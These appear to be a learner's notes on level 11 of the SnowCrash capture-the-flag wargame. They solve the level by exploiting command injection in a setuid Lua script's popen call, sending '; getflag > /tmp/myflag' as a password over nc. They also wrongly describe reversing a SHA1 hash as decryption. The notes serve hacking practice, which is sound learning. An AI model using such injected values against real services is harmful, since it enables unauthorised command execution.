level11@SnowCrash:~$ ls -la
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

.lua : Scripting Language used in video games, web applications, and embedded systems due to its small footprint and efficient execution.

in the level11.lua file :
f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
which is "NotSoEasy" once decrypted with sha1sum

not the flag11 pass tho

lua: ./level11.lua:3: address already in use

so trying to connect with nc :
level11@SnowCrash:~$ nc 127.0.0.1 5151
requires password 

When we look into the lua file, there is this line :
prog = io.popen("echo "..pass.." | sha1sum", "r")
which executes whatever is passed as password, trying to put a getflag in there

; getflag doesn't work but with a redirection to a file we can fetch the token 

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/myflag
